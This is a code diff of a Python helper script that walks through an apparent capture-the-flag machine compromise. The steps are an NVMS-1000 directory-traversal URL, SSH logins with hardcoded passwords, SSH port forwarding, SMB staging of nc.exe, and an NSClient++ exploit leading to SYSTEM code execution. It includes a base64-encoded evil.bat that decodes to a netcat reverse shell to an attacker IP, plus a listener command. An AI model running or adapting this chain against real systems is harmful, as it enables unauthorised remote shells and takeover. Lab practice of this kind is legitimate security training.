@@ -115,17 +115,18 @@ def download_files():
     commands_send('echo "QGVjaG8gb2ZmCmM6XHRlbXBcbmMuZXhlIDEwLjEwLjE2LjggNDQzIC1lIGNtZC5leGUK" | base64 -d > evil.bat')
     commands_send(f"sed -i 's/10.10.16.8/{machine_ip}/g' evil.bat")
 
-
-
 def conection_user_nadine():
     print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (ssh-Connection)] > " + Fore.LIGHTMAGENTA_EX + f"sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@{target_machine}")
 
 def connection_forwarding_nadine_and_root():
     print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (ssh-Connection-Port-Forwarding)] > " + Fore.LIGHTMAGENTA_EX + f"sshpass -p 'L1k3B1gBut7s@W0rk' ssh -L 8443:127.0.0.1:8443 Nadine@{target_machine}")
     print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (smbserver-Connection)] > " + Fore.LIGHTMAGENTA_EX + f"impacket-smbserver smbFolder $(pwd) -smb2support -username xyz -password xyz123")
-    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. cd C:/\n2. mkdir temp\n3. cd temp\n4. net use x: \\{machine_ip}\smbFolder /user:xyz xyz123\n5. copy x:\evil.bat evil.bat\n6. copy x:\nc.exe nc.exe")
-    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (ssh-Connection)] > " + Fore.LIGHTMAGENTA_EX + f"")
-
+    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. cd C:/\n2. mkdir temp\n3. cd temp\n4. net use x: \\{machine_ip}\smbFolder /user:xyz xyz123\n5. copy x:\evil.bat evil.bat\n6. copy x:\\nc.exe nc.exe")
+    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (Url-Connection)] > " + Fore.LIGHTMAGENTA_EX + f"https://localhost:8443/index.html#/settings/settings/external%20scripts/scripts   (Password: ew2x6SsGTxjRwXOT)")
+    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (Listen Http)] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
+    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [Nadine-user] > " + Fore.WHITE + f"Press ENTER to continue...")
+    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (Web)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. Key: pwned\n2. Value: c:\\temp\evil.bat")
+    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (Web)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. Save Configuration (In Changes)\n2. Reload (In Control)\n3. Wait and enter in Queries for get rce system32.")
 
 #------------------------------------------------------------------------
 
@@ -133,16 +134,21 @@ def undected():
     try:
         checker_status();cm.sleep(.8)
         default_cred_user();cm.sleep(.8)
+        download_files()
         print(Fore.YELLOW+f"=========================================")
         while True:
             opcion = menu_panel()
             print(Fore.YELLOW+f"=========================================")
             if opcion[0] == opcion[1][0]:
                 print(tmsg,hmsg("user","Nadine connection"))
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Exploit (NVMS-1000 - Directory Traversal)] > " + Fore.LIGHTMAGENTA_EX + f"http://{target_machine}/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt")
                 conection_user_nadine()
-                print(tmsg,Fore.LIGHTBLUE_EX +f"[woodenk] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
             elif opcion[0] == opcion[1][1]:
                 print(tmsg,hmsg("user","Root connection"))
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Exploit (Local File Inclusion)] > " + Fore.LIGHTMAGENTA_EX + f"https://localhost:8443/index.html#/settings/settings/external%20scripts/scripts")
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Exploit (Local Port Forwarding - SSH)] > " + Fore.LIGHTMAGENTA_EX + f"ssh Nadine@10.10.10.184 -L 8443:127.0.0.1:8443")
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Exploit (NSClient++ Exploit)] > " + Fore.LIGHTMAGENTA_EX + f"searchsploit -m windows/local/46802.txt")
                 print(tmsg,Fore.LIGHTBLUE_EX +f"[Root] > " + Fore.YELLOW + f"(Exploit) http://{target_machine}");cm.sleep(0.2)
                 connection_forwarding_nadine_and_root()
                 print(tmsg,Fore.LIGHTBLUE_EX +f"[Root] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
